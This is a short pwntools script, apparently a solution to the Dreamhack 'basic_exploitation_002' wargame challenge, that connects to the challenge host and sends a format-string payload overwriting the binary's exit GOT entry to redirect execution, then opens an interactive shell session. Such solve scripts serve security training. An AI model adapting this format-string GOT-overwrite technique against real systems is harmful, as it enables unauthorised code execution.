# Name: basic_exploitation_002.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 19985

p = remote(HOST,PORT)
e = ELF('./basic_exploitation_002')

exit = e.got['exit']

payload = p32(exit)
payload += p32(exit+2)
payload += '%{}c'.format(0x8609 - 8).encode()
payload += b'%1$hn'
payload += '%{}c'.format(0x804 - 0x8609 + 0x10000).encode()
payload += b'%2$hn'

p.send(payload)
p.interactive()